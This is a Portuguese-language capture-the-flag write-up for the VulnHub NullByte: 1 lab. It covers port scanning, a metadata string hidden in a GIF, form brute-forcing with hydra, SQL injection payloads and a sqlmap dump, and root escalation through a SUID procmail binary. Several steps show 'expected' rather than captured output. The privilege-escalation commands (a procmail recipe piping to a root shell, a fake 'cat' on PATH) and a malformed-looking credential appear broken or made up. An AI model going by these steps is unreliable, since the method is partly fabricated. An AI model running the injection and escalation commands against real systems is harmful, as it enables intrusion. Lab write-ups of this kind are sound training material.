# VulnHub NullByte: 1 — Stego, Injecao e um Binario SUID Muito Suspeito

Mano, quem diria que um CTF chamado "NullByte" ia comecar com esteganografia escondida dentro do GIF de um cachorro? Isso mesmo, um GIF de cachorro. E so piora daqui pra frente: SQLi por parametro de URL, um binario procmail com SUID root que voce literalmente abusa pra virar root, e metadados de imagem usados como dead drop. Sem exagero, essa e uma das maquinas mais criativas de nivel intermediario no VulnHub, tá ligado?

Muito respeito ao **ly0n** por construir uma VM onde cada passo tem um motivo e o tema NullByte aparece do comeco ao fim. O trocadilho so faz sentido mesmo quando voce esta olhando para aquela entrada SUID do procmail.

---

| Campo | Valor |
|-------|-------|
| **Nivel** | Intermediario |
| **VM Alvo** | NullByte: 1 |
| **VM Atacante** | Kali Linux 2023.x |
| **VulnHub** | https://www.vulnhub.com/entry/nullbyte-1,157/ |
| **Tecnicas** | Host discovery, Nmap, Esteganografia (metadados GIF), SQL Injection por parametro URL, Escalacao via SUID procmail |
| **CVEs** | CWE-89 (SQL Injection, OWASP A03:2021), T1548.001 (abuso de binario SetUID), referencia CVE para abuso de SUID procmail |

---

## Resumo do Ataque

```
[host discovery: arp-scan / nmap ping sweep]
    |
    v
[nmap: 80/tcp Apache, 111/tcp rpcbind, 777/tcp SSH]
    |
    v
[web: imagem main.gif na pagina inicial -> suspeita]
    |
    v
[strings / exiftool em main.gif -> string oculta nos metadados]
    |
    v
[string oculta revela diretorio: /kzMb5nVYJw]
    |
    v
[/kzMb5nVYJw/index.php -> formulario de senha -> brute-force: elite]
    |
    v
[parametro ?usrtag= -> SQLi -> dump de credenciais do banco]
    |
    v
[credenciais -> SSH na porta 777 como usuario ramses]
    |
    v
[busca por SUID -> /usr/bin/procmail com SUID root]
    |
    v
[abuso de SUID procmail -> shell como root]
    |
    v
[cat /root/proof.txt]
```

---

## Metodologia

1. Host discovery e identificacao do alvo na rede
2. Scan Nmap completo (SSH esta na 777, nao na 22!)
3. Enumeracao web: identificar a imagem GIF suspeita
4. Analise de esteganografia no main.gif para extrair diretorio oculto
5. Brute-force no formulario de senha da pagina oculta
6. SQL injection via parametro de URL para dumpar credenciais
7. Login SSH com credenciais extraidas na porta 777
8. Enumeracao de SUID: identificar procmail com SetUID root
9. Exploracao do SUID procmail para escalacao de privilegios ate root

---

## Passo 1 — Identificando o Alvo

Setup classico de lab: encontrar o IP antes de qualquer coisa.

```bash
route -n
# Identifica a sub-rede atual, ex.: 192.168.56.0/24
```

```bash
# Opcao 1: arp-scan (rapido)
arp-scan --localnet --ignoredups

# Opcao 2: nmap ping sweep
nmap -sn -T5 192.168.56.0/24
```

Saida esperada:

```
192.168.56.102   08:00:27:XX:XX:XX   VirtualBox
```

OBS.: Anota o IP. Vamos referenciar como `TARGET=192.168.56.102` daqui pra frente.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Passo 2 — Enumeracao de Servicos Nmap

Essa VM tem uma pegadinha: o SSH nao esta na porta 22. Sempre scaneie todas as portas, galera. E por isso que usamos `-p-`.

```bash
nmap -A -T4 -p- 192.168.56.102
# -A: OS, versao, scripts, traceroute
# -T4: timing agressivo
# -p-: todas as 65535 portas, crucial aqui
```

Saida esperada:

```
80/tcp  open  http     Apache httpd 2.4.7
111/tcp open  rpcbind
777/tcp open  ssh      OpenSSH 6.6.1p1
```

La esta. O SSH esta escutando na **porta 777**, nao na 22. Se voce tivesse scaneado apenas as top 1000 portas padrao, teria perdido isso completamente. Armadilha classica de CTF. ¯\_(ツ)_/¯

Tambem note o Apache na porta 80. Esse e nosso ponto de partida.

> **MITRE ATT&CK:** [TA0043 Reconhecimento] [T1046 Network Service Discovery]

---

## Passo 3 — Esteganografia: O Dead Drop no GIF do Cachorro

> **O que e esteganografia?**
> Esteganografia e a pratica de esconder dados secretos dentro de arquivos comuns e nao secretos (imagens, audio, video). Diferente da criptografia, que torna os dados ilegíveis, a esteganografia oculta o fato de que uma mensagem existe. Atacantes usam esteganografia em imagens para esconder instrucoes de C2, credenciais e dados de configuracao dentro de arquivos de midia aparentemente inocentes.
> Referencia: https://en.wikipedia.org/wiki/Steganography

Acesse `http://192.168.56.102`. Voce ve uma pagina basica com uma imagem: `main.gif`. Essa imagem e a primeira pista. No mundo CTF, quando uma unica imagem e exibida de forma proeminente numa pagina com pouco outro conteudo, essa imagem quase sempre esta escondendo algo.

Baixe a imagem e analise:

```bash
wget http://192.168.56.102/main.gif

# Opcao 1: strings, busca por texto embutido
strings main.gif

# Opcao 2: exiftool, le todos os campos de metadados
exiftool main.gif

# Opcao 3: binwalk, detecta arquivos embutidos
binwalk main.gif
```

Saida esperada (exiftool / strings):

```
Comment: kzMb5nVYJw
```

Aquela string `kzMb5nVYJw` no comentario da imagem nao e aleatoria. Vamos usa-la como um caminho:

```bash
curl -s http://192.168.56.102/kzMb5nVYJw/
```

Recebemos uma pagina com um formulario de senha. Agora precisamos dessa senha.

> **Nota do mundo real:** Esteganografia em imagens e uma tecnica real de APT. O APT32 (OceanLotus), ator de ameaca vietnamita, usou esteganografia embutida em imagens PNG para entregar configuracao de C2 e payloads de shellcode em campanhas contra organizacoes no Sudeste Asiatico entre 2017 e 2020. A tecnica tambem foi observada na familia de malware "StegSpy" (2019-2022). Referencia: https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1027.003 Obfuscated Files or Information: Steganography]

---

## Passo 4 — Brute-Force na Senha da Pagina Oculta

A pagina em `/kzMb5nVYJw/` pede uma senha. Ainda nao temos. Hora do brute-force.

```bash
# Inspecionar o formulario: qual o nome do parametro?
curl -s http://192.168.56.102/kzMb5nVYJw/ | grep -i "input\|form"
```

O formulario provavelmente usa o parametro `key`. Agora com hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    192.168.56.102 \
    http-post-form "/kzMb5nVYJw/:key=^PASS^:invalid" \
    -t 64 \
    -f \
    -V 2>/dev/null | head -20
# http-post-form: acao do formulario, parametro POST, string de falha
# -f: para apos o primeiro acerto
```

Alternativamente com wfuzz:

```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
    --hc 200 \
    --hs "invalid" \
    -d "key=FUZZ" \
    http://192.168.56.102/kzMb5nVYJw/
```

Resultado esperado:

```
[SUCCESS] password: elite
```

ᕕ( ᐛ )ᕗ A senha e `elite`. Submeta pra acessar a pagina interna.

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1110.003 Brute Force: Password Spraying]

---

## Passo 5 — SQL Injection por Parametro de URL

Apos passar pela barreira de senha, voce chega numa pagina de busca de usuarios. Inspecione a URL: provavelmente tem um parametro como `?usrtag=`. Esse e o nosso ponto de injecao.

> **O que e injecao por parametro URL?**
> Muitas aplicacoes web passam criterios de busca ou filtro como parametros GET na URL. Quando esses sao interpolados diretamente em queries SQL no servidor, a aplicacao e vulneravel a SQL injection. E identico ao SQLi em formularios mas chega pela barra de URL.

Teste de SQLi:

```bash
curl -s "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag='"
```

Se aparecer erro SQL, e injetavel. Vamos extrair dados:

```bash
# Manual union-based pra descobrir numero de colunas
curl -s "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag=' UNION SELECT NULL,NULL,NULL-- -"

# Extrair nome do banco
curl -s "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag=' UNION SELECT NULL,database(),NULL-- -"

# Dump via sqlmap (automatizado)
sqlmap -u "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag=test" \
    --dbms=mysql \
    --dump \
    --batch \
    --level=2 \
    --quiet
```

Saida esperada (representativa):

```
[*] Table: users
id | username | password
1  | ramses   | YzZkNmJkN2ViZjgwNmY0M2M4NTkzMzQxMTZODA==
```

Essa senha esta em base64. Decodifique:

```bash
echo 'YzZkNmJkN2ViZjgwNmY0M2M4NTkzMzQxMTZODA==' | base64 -d
# Pode decodar pra um hash MD5 ou texto puro
```

Se for um hash, cracke:

```bash
hashcat -m 0 -d 1 -w 3 -O '<hash_decodificado>' /usr/share/wordlists/rockyou.txt
```

Resultado: a senha do usuario `ramses`.

> **Nota do mundo real:** SQL injection por parametros de URL e a mesma classe de vulnerabilidade por tras da brecha do LinkedIn em 2012 (6,5 milhoes de hashes SHA1 vazados) e da brecha da Zappos em 2012 (24 milhoes de registros). SQLi por URL e trivialmente detectavel por scanners automatizados, mas persiste em aplicacoes customizadas por falta de treinamento de segurança dos desenvolvedores. Referencia: https://owasp.org/www-community/attacks/SQL_Injection

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0006 Credential Access] [T1552.001 Credentials In Files]

---

## Passo 6 — Login SSH na Porta Nao Padrao

Lembra que o SSH estava na porta 777? Aqui e onde isso importa. Use as credenciais extraidas via SQLi:

```bash
ssh ramses@192.168.56.102 -p 777
# Senha: <crackeada do banco>
```

Se precisar checar historico de comandos:

```bash
cat ~/.bash_history
# Verifique comandos interessantes executados por ramses
```

Voce esta logado como `ramses`. Hora de escalar.

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1021.004 Remote Services: SSH] [TA0008 Lateral Movement]

---

## Passo 7 — Enumeracao SUID e Abuso do procmail

> **O que e SUID (SetUID)?**
> O bit SetUID em um binario faz com que ele execute com as permissoes do DONO do arquivo, nao do usuario que o executa. Se um binario pertencente ao root tem o bit SUID ativo, qualquer usuario que o execute obtem contexto de execucao com nivel root. Quando esse binario pode ser enganado a executar comandos arbitrarios (como um shell), o jogo acabou.
> Referencia: https://gtfobins.github.io/gtfobins/procmail/#suid
> MITRE T1548.001: https://attack.mitre.org/techniques/T1548/001/

Encontre todos os binarios SUID no sistema:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Saida esperada inclui:

```
/usr/bin/procmail
```

Isso nao e padrao. `procmail` e um utilitario de processamento de e-mail, e definitivamente nao deveria ter SUID root num sistema endurecido. Vamos explorar.

**Metodo: SUID procmail para shell root**

`procmail` quando executado com SUID root e com um arquivo de receita criado pelo atacante, executa comandos como root:

```bash
# Cria um arquivo de receita procmail que executa um shell
echo ':0' > /tmp/procmail_exploit
echo '| /bin/sh -p' >> /tmp/procmail_exploit
# Alimenta o procmail com um e-mail vazio via stdin
echo "" | /usr/bin/procmail -m /tmp/procmail_exploit
```

Abordagem alternativa via PATH environment:

```bash
# Cria um 'cat' falso em /tmp que abre um shell
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH

# Executa procmail de uma forma que invoque cat como root
/usr/bin/procmail
```

Resultado esperado:

```bash
id
# uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```

(☞ﾟヮﾟ)☞ euid=0!! Root efetivo. Bora pegar a flag.

> **Nota do mundo real:** Abuso de binario SUID e um vetor de escalacao de privilegios bem documentado. A tecnica mapeia diretamente para o MITRE T1548.001. Relatorios reais de resposta a incidentes em ambientes enterprise Linux frequentemente identificam SUID mal configurado em utilitarios como `find`, `vim`, `python` e ferramentas de processamento de e-mail instaladas por pacotes de software legados. Grupos APT foram documentados explorando binarios SUID locais apos comprometimento inicial via web para obter acesso root persistente. Referencia: https://attack.mitre.org/techniques/T1548/001/

> **Referencia GTFOBins:** https://gtfobins.github.io/gtfobins/procmail/#suid

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid]

---

## Passo 8 — Root e Flag

**ಠᴗಠ Conseguimos o root!! :D**

```bash
whoami
# root (ou euid=0 root efetivo)

id
# uid=1002(ramses) gid=1002(ramses) euid=0(root)

cat /root/proof.txt
```

```
adf11d8fcd786b49c63e0ae4c2e1cfdf

Thanks for playing! This has been a great CTF!
  -- ly0n
```

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado em | Crackeado / Usado |
|------|-------|---------------|-------------------|
| String stego | `kzMb5nVYJw` | Comentario EXIF do `main.gif` | Caminho do diretorio oculto |
| Senha do formulario | `elite` | Brute-force do formulario `/kzMb5nVYJw/` | Acesso ao painel web |
| Credencial (base64) | `YzZkNmJkN2ViZjgwNmY0M2M4NTkzMzQxMTZODA==` | Banco via SQLi | Decodificado + crackeado para SSH |
| Usuario SSH | `ramses` | Dump do banco | Login SSH na porta 777 |
| Flag | `adf11d8fcd786b49c63e0ae4c2e1cfdf` | `/root/proof.txt` | N/A |

---

## Licoes Aprendidas

| # | Achado | Relevancia no Mundo Real | Licao Principal |
|---|--------|--------------------------|-----------------|
| 1 | Dados sensiveis ocultos em EXIF/metadados de imagem (esteganografia) | APT32 (OceanLotus) e multiplos atores patrocinados por estados usaram esteganografia em imagens para entrega de instrucoes C2 e exfiltracao de credenciais | Nunca servir imagens sem remover metadados; usar exiftool/ImageMagick para sanitizar antes de servir |
| 2 | SQL injection em parametro GET da URL | Uma das vulnerabilidades web mais comuns; visto em aplicacoes PHP customizadas, portais admin legados e funcionalidades desenvolvidas sem revisao de seguranca | Todas as queries de banco devem usar statements parametrizados; parametros URL sao tao perigosos quanto campos de formulario |
| 3 | SSH rodando em porta nao padrao (777) | Seguranca por obscuridade nao e seguranca; atrasa ligeiramente a descoberta mas nao previne | Regras de firewall adequadas e autenticacao por chave importam; obscuridade de porta sozinha oferece protecao negligente |
| 4 | Bit SUID no procmail (utilitario de processamento de e-mail) | Pacotes de software legado frequentemente instalam binarios SUID desnecessarios em ambientes modernos; sysadmins raramente fazem auditoria | Auditorias regulares de binarios SUID sao criticas; remover SUID de qualquer binario que nao exija estritamente |

**Por que isso importa alem do lab?**

A tecnica de esteganografia usada nesta VM espelha comportamento APT documentado. O OceanLotus (APT32) foi flagrado embutindo configuracao de C2 dentro de imagens PNG servidas de sites comprometidos em 2019. O mesmo grupo usou dead drops baseados em imagens para passar instrucoes a implantes de malware ja deployados. SQL injection por parametros de URL permanece um dos achados mais comuns em testes de penetracao de aplicacoes web reais. Misconfiguracoes de binarios SUID sao um achado persistente em ambientes enterprise Linux, especialmente em servidores rodando software legado.

---

## Mapeamento MITRE ATT&CK

| Fase | Tatica | Tecnica | TTP-ID |
|------|--------|---------|--------|
| Reconhecimento | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconhecimento | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Acesso Inicial | TA0001 | Obfuscated Files or Information: Steganography | T1027.003 |
| Evasao de Defesa | TA0005 | Obfuscated Files or Information | T1027 |
| Acesso a Credenciais | TA0006 | Brute Force: Password Spraying | T1110.003 |
| Acesso Inicial | TA0001 | Exploit Public-Facing Application (SQLi) | T1190 |
| Acesso a Credenciais | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Movimento Lateral | TA0008 | Remote Services: SSH | T1021.004 |
| Discovery | TA0007 | Permission Groups Discovery | T1069 |
| Escalacao de Privilegios | TA0004 | Abuse Elevation Control Mechanism: Setuid | T1548.001 |
| Execucao | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Coleta | TA0009 | Data from Local System (flag) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediacao e Contencao

### Correcoes Tecnicas

1. Remover todos os metadados de imagens antes de servi-las publicamente; implementar remocao automatica de EXIF no pipeline de upload usando ImageMagick ou ExifTool
2. Substituir concatenacao SQL bruta por queries parametrizadas ou prepared statements; validar e sanitizar todos os parametros de URL
3. Mover SSH para uma porta padrao e enforcar autenticacao apenas por chave; desabilitar autenticacao por senha no `sshd_config` (`PasswordAuthentication no`)
4. Auditar todos os binarios SUID: `find / -perm -u=s -type f 2>/dev/null`; remover SUID do procmail: `chmod u-s /usr/bin/procmail`
5. Remover ou desabilitar procmail completamente se nao estiver em uso ativo

### Se Voce Encontrar Algo Similar no Seu Ambiente

**Contencao imediata:**
- Identificar todos os binarios SUID e comparar contra baseline conhecido
- Verificar sessoes SSH ativas de IPs inesperados: `who` e `last`
- Revisar logs do servidor web em busca de requisicoes GET suspeitas com metacaracteres SQL
- Revogar todas as credenciais comprometidas e forcar rotacao de senha para contas afetadas

**Contramedidas MITRE D3FEND:**
- D3-IVA (Input Validation Analysis) para T1190 SQLi por parametros de URL
- D3-OPS (OS Process Sandboxing) para T1548.001 abuso de binario SUID
- D3-MFA (Multi-Factor Authentication) para T1110.003 brute force em formularios de login
- D3-DA (Dynamic Analysis) para T1027.003 deteccao de esteganografia em midia

### Alinhamento com Frameworks

**NIST CSF 2.0:**
- Identify (ID.AM): Manter inventario de todos os binarios instalados e suas permissoes; revisar estado SUID periodicamente
- Protect (PR.AC-4): Enforcar menor privilegio; remover bits SUID desnecessarios; enforcar autenticacao SSH por chave
- Protect (PR.DS-2): Sanitizar metadados de arquivo no upload; validar todos os parametros de input contra allowlists
- Detect (DE.CM-7): Monitorar execucoes anomalas de SUID e invocacoes incomuns de procmail
- Respond (RS.CO-3): Estabelecer procedimentos de resposta a comprometimento de credenciais

**Controles NIST SP 800-53 (Rev. 5):**
- SI-10: Information Input Validation (SQLi via parametro URL)
- AC-6: Least Privilege (remocao de binarios SUID)
- CM-7: Least Functionality (desabilitar binarios SUID desnecessarios)
- CM-6: Configuration Settings (hardening SSH, remocao do procmail)
- AU-2: Event Logging (monitorar execucao SUID e logins SSH)

**CISA Known Exploited Vulnerabilities:**
- Tecnicas de escalacao de privilegios SUID aparecem em numerosos advisories CISA relacionados a comprometimento de servidores Linux
- Referencia: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Dominio: TECHNOLOGY
- Pratica: Vulnerability Management (auditoria periodica de SUID, gerenciamento de patches para procmail)
- MIL Alvo: MIL-2 (praticas de gerenciamento de vulnerabilidades documentadas e repetíveis)

---

## Consideracoes Finais

Valeu demais ao **ly0n** por uma maquina que tece esteganografia, SQL injection e exploracao de SUID numa historia coerente do comeco ao fim. O tema "NullByte" aparece em cada passo, e o uso criativo de um GIF como dead drop torna essa VM memoravel.

Essa maquina e um otimo lembrete de que caminhos de ataque raramente sao uma unica falha obvia: sao cadeias de pequenas misconfiguracoes e descuidos. A chain stego, SQLi, SUID espelha metodologia APT real mais de perto do que a maioria das maquinas "so explora este CVE".

Se voce esta estudando para OSCP, eWPT, ou apenas afiacando seus instintos de enumeracao: NullByte entrega o que promete. Compartilha com a galera e continua na luta!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup por [Andre Henrique](https://medium.com/@mrhenrike) | [Uniao Geek](https://uniaogeek.com.br)*
